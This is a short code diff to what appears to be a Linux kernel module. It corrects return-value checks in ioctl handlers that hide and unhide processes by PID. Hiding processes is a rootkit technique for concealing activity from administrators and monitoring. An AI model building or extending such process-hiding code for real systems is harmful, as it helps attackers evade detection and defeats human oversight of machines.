@@ -134,7 +134,7 @@ int ioc_hide_pid(module_dev_t* p_dev, pid_t pid)
     if (mutex_lock_interruptible(&p_dev->lock)) {
         return -ERESTARTSYS;
     }
-    if (hash_tbl_insert(&p_dev->hash_tbl, pid)) {
+    if (hash_tbl_insert(&p_dev->hash_tbl, pid) == 0) {
         retval = process_hide(pid);
         if (retval != 0) {
             hash_tbl_erase(&p_dev->hash_tbl, pid);
@@ -155,7 +155,7 @@ int ioc_show_pid(module_dev_t* p_dev, pid_t pid)
     if (mutex_lock_interruptible(&p_dev->lock)) {
         return -ERESTARTSYS;
     }
-    if (hash_tbl_erase(&p_dev->hash_tbl, pid)) {
+    if (hash_tbl_erase(&p_dev->hash_tbl, pid) == 0) {
         retval = process_show(pid);
     }
     mutex_unlock(&p_dev->lock);
